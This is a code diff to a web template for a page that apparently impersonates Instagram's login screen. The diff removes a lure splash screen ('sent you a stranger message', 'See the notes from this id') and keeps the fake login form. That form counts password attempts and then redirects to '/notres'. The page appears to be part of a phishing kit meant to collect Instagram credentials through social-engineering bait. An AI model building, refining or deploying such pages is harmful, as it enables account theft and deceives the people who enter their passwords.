@@ -17,25 +17,8 @@
     <!-- Background is now handled by layout.hbs -->
 
 
-    <!-- Splash Screen -->
-    <div id="splash-screen" class="container splash-container">
-        <div class="splash-profile-wrapper">
-            <!-- Placeholder for Instagram Profile Pic -->
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/ac/Default_pfp.jpg" alt="Profile"
-                class="splash-profile-pic">
-            <div class="splash-badge">1</div>
-        </div>
-
-        <h3 class="splash-username">@luk_man_c_</h3>
-        <p class="splash-text">sent you a stranger message</p>
-
-        <button id="view-notes-btn" class="btn-login splash-btn">
-            See the notes from this id
-        </button>
-    </div>
-
     <!-- Login Container -->
-    <div id="login-container" class="container" style="display: none; opacity: 0;">
+    <div id="login-container" class="container">
 
         <img class="insta-logo"
             src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Instagram.svg/2048px-Instagram.svg.png"
@@ -70,44 +53,8 @@
     </div>
 
     <script>
-        // Check if user has already visited - if yes, skip splash and show login directly
-        const hasVisited = localStorage.getItem('hasVisitedLogin');
-
-        if (hasVisited === 'true') {
-            const splash = document.getElementById('splash-screen');
-            const login = document.getElementById('login-container');
-
-            splash.style.display = 'none';
-            login.style.display = 'block';
-            login.style.opacity = '1';
-        }
-
         // Reset attempt counter on every page refresh
         sessionStorage.setItem('loginAttempts', '0');
-
-        // Splash screen transition
-        document.getElementById('view-notes-btn').addEventListener('click', function () {
-            const splash = document.getElementById('splash-screen');
-            const login = document.getElementById('login-container');
-
-            // Mark that user has visited
-            localStorage.setItem('hasVisitedLogin', 'true');
-
-            // Fade out splash
-            splash.style.opacity = '0';
-            splash.style.transform = 'scale(0.95)';
-
-            setTimeout(() => {
-                splash.style.display = 'none';
-
-                // Show and fade in login
-                login.style.display = 'block';
-                // Trigger reflow
-                void login.offsetWidth;
-                login.style.opacity = '1';
-                login.style.transform = 'scale(1)';
-            }, 500); // Wait for transition
-        });
 
         // Handle login form submission with attempt counter
         document.getElementById('login-form').addEventListener('submit', function (e) {
@@ -133,10 +80,6 @@
                 window.location.href = '/notres';
                 return;
             }
-
-
-            // Mark that user has visited and attempted login
-            localStorage.setItem('hasVisitedLogin', 'true');
 
             // Otherwise submit the form normally
             this.submit();
